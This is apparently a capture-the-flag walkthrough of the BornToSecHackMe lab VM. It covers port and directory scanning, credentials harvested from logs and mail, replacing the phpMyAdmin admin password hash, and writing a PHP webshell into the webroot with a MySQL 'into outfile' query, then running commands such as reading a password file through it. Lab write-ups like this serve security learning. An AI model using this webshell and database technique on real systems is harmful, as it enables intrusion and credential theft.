`$ ifconfig`

![image](https://github.com/user-attachments/assets/ca4fd3bb-b9af-426c-8050-4502cfd94372)

nmap - Network exploration tool and security / port scanner

`$ nmap -sP 192.168.56.0/24`

![image](https://github.com/user-attachments/assets/88d8f879-1eae-4108-9d7a-98da258df4c7)

`$ ping 192.168.56.103`

![image](https://github.com/user-attachments/assets/246a5ac7-bcf6-4abe-aa4e-a8a1ae994a14)

`$ nmap -sV 192.168.56.103`

![image](https://github.com/user-attachments/assets/9192dcd2-6b76-41f9-b98e-e91de935619f)

```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd

```
![image](https://github.com/user-attachments/assets/432e65e0-151f-4ee0-a6dc-0deee264f9d2)

![image](https://github.com/user-attachments/assets/11e9b058-a8a1-445a-81de-36cde81760e4)

`$ nikto -h http://192.168.56.103`

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2024-08-09 13:46:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 13650, size: 1025, mtime: Wed Oct  7 19:37:54 2015. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-08-09 13:47:02 (GMT-4) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Directory Enumeration

`$ dirb http://192.168.56.103`
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Aug  9 13:50:48 2024
URL_BASE: http://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                           GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.103/ ----
                                                                           + http://192.168.56.103/cgi-bin/ (CODE:403|SIZE:290)                      
                                                                           ==> DIRECTORY: http://192.168.56.103/fonts/
+ http://192.168.56.103/forum (CODE:403|SIZE:287)                         
+ http://192.168.56.103/index.html (CODE:200|SIZE:1025)                   
+ http://192.168.56.103/server-status (CODE:403|SIZE:295)                 
                                                                          
---- Entering directory: http://192.168.56.103/fonts/ ----
                                                                           (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Aug  9 13:50:52 2024
DOWNLOADED: 4612 - FOUND: 4
```
I assumed the server would be running on http but nothing substantial came out of this search so I was mistaken.

`dirb https://192.168.56.103/ -o dirb.txt`

![image](https://github.com/user-attachments/assets/3931c147-cee5-499a-9fb9-b2c15577fcc5)

Too many results, it will be hard to effectively go through it all but I will save them in a seperate file just in case. 

`$ dirb https://192.168.56.103/ -r`         

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug 12 04:35:41 2024
URL_BASE: https://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

                                                                            GENERATED WORDS: 4612

---- Scanning URL: https://192.168.56.103/ ----
                                                                            + https://192.168.56.103/cgi-bin/ (CODE:403|SIZE:291)                      
                                                                            ==> DIRECTORY: https://192.168.56.103/forum/
                                                                            ==> DIRECTORY: https://192.168.56.103/phpmyadmin/
+ https://192.168.56.103/server-status (CODE:403|SIZE:296)                 
                                                                            ==> DIRECTORY: https://192.168.56.103/webmail/
                                                                               
-----------------
END_TIME: Mon Aug 12 04:35:45 2024
DOWNLOADED: 4612 - FOUND: 2
```

With the **non-recursive** option dirb will just list the first level directories of the main URL that was specified in the command. We don't have the permission to access 2 of these directories as indicated by the **403 status code**. But we 3 new directories ready for inspection:
- /forum
- /phpmyadmin
- /webmail

## /forum

`dirb https://192.168.56.103/forum`
```
---- Scanning URL: https://192.168.56.103/forum/ ----
+ https://192.168.56.103/forum/backup (CODE:403|SIZE:295)                                 
+ https://192.168.56.103/forum/config (CODE:403|SIZE:295)                                 
==> DIRECTORY: https://192.168.56.103/forum/images/                                       
==> DIRECTORY: https://192.168.56.103/forum/includes/                                     
+ https://192.168.56.103/forum/index (CODE:200|SIZE:4935)                                 
+ https://192.168.56.103/forum/index.php (CODE:200|SIZE:4935)                             
==> DIRECTORY: https://192.168.56.103/forum/js/                                           
==> DIRECTORY: https://192.168.56.103/forum/lang/                                         
==> DIRECTORY: https://192.168.56.103/forum/modules/                                      
==> DIRECTORY: https://192.168.56.103/forum/templates_c/                                  
==> DIRECTORY: https://192.168.56.103/forum/themes/                                       
==> DIRECTORY: https://192.168.56.103/forum/update/

```
![image](https://github.com/user-attachments/assets/a3fb315d-23a3-4d81-8110-b9c7e3221582)

![image](https://github.com/user-attachments/assets/daf8c625-7a02-4013-ba44-c58a47ab1196)

`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`


`Username: lmezard`

`Password: !q\]Ej?*5K5cy*AJ`

![image](https://github.com/user-attachments/assets/e2fa56be-582c-49f6-b0f2-442d6b336b5e)

![image](https://github.com/user-attachments/assets/6e796a36-c732-4ed0-89c6-1efe063a89b9)

`laurie@borntosec.net`

## /webmail

`dirb https://192.168.56.103/webmail`

```
+ https://192.168.56.103/webmail/class (CODE:403|SIZE:296)                                
==> DIRECTORY: https://192.168.56.103/webmail/config/                                     
+ https://192.168.56.103/webmail/functions (CODE:403|SIZE:300)                            
+ https://192.168.56.103/webmail/help (CODE:403|SIZE:295)                                 
==> DIRECTORY: https://192.168.56.103/webmail/images/                                     
+ https://192.168.56.103/webmail/include (CODE:403|SIZE:298)                              
+ https://192.168.56.103/webmail/index.php (CODE:302|SIZE:0)                              
+ https://192.168.56.103/webmail/locale (CODE:403|SIZE:297)                               
==> DIRECTORY: https://192.168.56.103/webmail/plugins/                                    
==> DIRECTORY: https://192.168.56.103/webmail/src/                                        
==> DIRECTORY: https://192.168.56.103/webmail/themes/
```

![image](https://github.com/user-attachments/assets/8ea8e0e3-ab2c-48fa-9b5e-1b8615bc9232)

We can login with the previous credentials.

![image](https://github.com/user-attachments/assets/7889eec2-fc09-4af0-ac34-f88e129f5de3)

```
Subject:   	DB Access
From:   	qudevide@mail.borntosec.net
Date:   	Thu, October 8, 2015 11:25 pm
To:   	laurie@borntosec.net
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
## /phpmyadmin

```
+ https://192.168.56.103/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                     
+ https://192.168.56.103/phpmyadmin/index.php (CODE:200|SIZE:7540)                        
==> DIRECTORY: https://192.168.56.103/phpmyadmin/js/                                      
+ https://192.168.56.103/phpmyadmin/libraries (CODE:403|SIZE:303)                         
==> DIRECTORY: https://192.168.56.103/phpmyadmin/locale/                                  
+ https://192.168.56.103/phpmyadmin/phpinfo.php (CODE:200|SIZE:7540)                      
+ https://192.168.56.103/phpmyadmin/setup (CODE:401|SIZE:482)                             
==> DIRECTORY: https://192.168.56.103/phpmyadmin/themes/ 
```

![image](https://github.com/user-attachments/assets/be7db68a-8a54-4f1d-aaaa-9d180283e56c)

![image](https://github.com/user-attachments/assets/a2ad9a22-869f-4af9-9d0d-fd54e089b8b8)

```
MySQL

    Server: Localhost via UNIX socket
    Server version: 5.5.44-0ubuntu0.12.04.1
    Protocol version: 10
    User: root@localhost
    MySQL charset: UTF-8 Unicode (utf8)


```

```
Web server

    Apache/2.2.22 (Ubuntu)
    MySQL client version: 5.5.44
    PHP extension: mysqli 
```

```
phpMyAdmin

    Version information: 3.4.10.1deb1
```

![image](https://github.com/user-attachments/assets/a0a54a24-f5fe-48bd-bda8-05af5acf86dc)

![image](https://github.com/user-attachments/assets/2e3ded56-1946-4311-8a51-3397aea3e58f)

`ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28`

So, we were able to get the password hash for the admin. But I was unable to crack the hash. The old friend `john` or `crackstation` couldn't help. It would have been good to know more about the kind of hashing alghoritm they used. Let's see if we can figure that out.

We see that the forum is powered by [mylittleforum](https://mylittleforum.net/) which is a simple PHP and MySQL based internet forum that displays the messages in classical threaded view (tree structure). It is Open Source licensed under the GNU General Public License.

![image](https://github.com/user-attachments/assets/f25df078-8aa2-4ca9-8516-6f57e0b809f9)

We can navigate to the source code from here:

![image](https://github.com/user-attachments/assets/a277dca3-a31b-49dc-b5dc-3b260716da97)

![image](https://github.com/user-attachments/assets/28fe96ca-0d14-4bac-a89a-283e0f8cf22b)

![image](https://github.com/user-attachments/assets/24345c76-2b79-45c0-98e5-360cd8fff505)

```
function generate_pw_hash($pw) {
	$salt = random_string(10, '0123456789abcdef');
	$salted_hash = sha1($pw.$salt);
	$hash_with_salt = $salted_hash.$salt;
	return $hash_with_salt;
}
```

The hash is composed of a salted SHA-1 hash. In the light of this information I was still unable to crack the admin's password hash. So I decided to just generate my own hash. Here is a simple script:
```
<?php
function generate_pw_hash($pw) {
    $salt = '5f4dcc3b5d';  // 10 random chars for salt
    $salted_hash = sha1($pw . $salt);
    $hash_with_salt = $salted_hash . $salt;
    return $hash_with_salt;
}

$password = '123';
$new_hash = generate_pw_hash($password);
echo $new_hash;
?>
```

`$ php ./generate_hash.php` outputs `15f32d5a4abd9ae09034e5b2b4e6e29e8b8592525f4dcc3b5d`

After replacing this with the admin's user_pw we will be able to login to the account with the password `123`

![image](https://github.com/user-attachments/assets/cc14dcdc-484a-47ab-a932-0c8ff76f2e10)

![image](https://github.com/user-attachments/assets/d59dfe2a-5c9a-4bb6-859d-f5ef57eb836d)

We are in. However this was absolutely useless. I changed various forum settings like enabling all users to upload images and attempted to inject a payload via image upload. It didn't work. 

![image](https://github.com/user-attachments/assets/2bfd32d3-2646-472e-9be2-045545bc989d)

Some links if you want to try it out yourself:

https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/

https://infosecwriteups.com/bypassed-and-uploaded-a-sweet-reverse-shell-d15e1bbf5836

Very very sad.

## Attempt 2
 This was the payload I was working with `<?php system($_GET[‘c’]);?>`.

 [system](https://www.php.net/manual/en/function.system.php) — Execute an external program and display the output
 
[$_GET](https://www.php.net/manual/en/reserved.variables.get.php) An associative array of variables passed to the current script via the URL parameters (aka. query string).

 Our goal will be to upload this to the victim site and execute something along the lines of `example.com/upload/test.php?c=whoami`

 We have root access to the database and we can run SQL queries on the server. The plan is to upload a webshell in the webroot, [see](https://www.infosecinstitute.com/resources/hacking/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/).

The [default document root](https://askubuntu.com/questions/683953/where-is-apache-web-root-directory-on-ubuntu) for Apache is **/var/www/** (before Ubuntu 14.04) or /var/www/html/ (Ubuntu 14.04 and later)

We can use the into outfile command write the output of the query into a file at the specified location on the server. Neat [tutorial](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/) that I will be following.

Going back to our dirb results, I one by one tried every subdirectory that returned status code 200.
`forum/templates_c` turned out to be the only one where we have write right.

`select 1, '<?php system($_GET["c"]); ?>' into outfile '/var/www/forum/templates_c/cmd.php'`

![image](https://github.com/user-attachments/assets/17eb0165-0061-4f1a-aa94-74f9697c3991)

Now if we visit `https://192.168.56.103/forum/templates_c/cmd.php`

![image](https://github.com/user-attachments/assets/2df4be2f-d5e9-4594-bf8a-852a2d1093d5)

We can see that our file exists and is returning the output for select 1

Now let's try supplying a system command as a parameter: `https://192.168.56.103/forum/templates_c/cmd.php?c=whoami`

![image](https://github.com/user-attachments/assets/fe8c425d-4bf4-4f84-a23a-fade6151838a)

We get the results of both select 1 query and the whoami command seperated into different columns. It appears that the current user is [`www-data`](https://askubuntu.com/questions/873839/what-is-the-www-data-user)

_The web server has to be run under a specific user._

_If it were run under root, then all the files would have to be accessible by root and the user would need to be root to access the files. With root being the owner, a compromised web server would have access to your entire system._

_By default the configuration of the owner is www-data in the Ubuntu configuration of Apache2._

`https://192.168.56.103/forum/templates_c/cmd.php?c=find%20/%20-user%20www-data%202%3E/dev/null`

![image](https://github.com/user-attachments/assets/33b95b55-4451-4fff-91dc-b26316bdfc3c)

Interesting

`https://192.168.56.103/forum/templates_c/cmd.php?c=ls%20/home`

We only have access to the LOOKATME directory

![image](https://github.com/user-attachments/assets/2a66352d-89ed-4bb0-9155-90495e68741b)

`https://192.168.56.103/forum/templates_c/cmd.php?c=cat%20/home/LOOKATME/password`

We get another set of credentials for the user lmezard: `lmezard:G!@M6f4Eatau{sF"` We already have lmezard's account for SquirrelMail and the forum. Attempting to login to phpMyAdmin was no use either(Which was expected as it was mentioned in the mails that lmezard should be using the root account from now on). 


![image](https://github.com/user-attachments/assets/03d0eff6-7cc2-4c1a-9766-5fc0d6350c2e)

`lmezard:G!@M6f4Eatau{sF"`
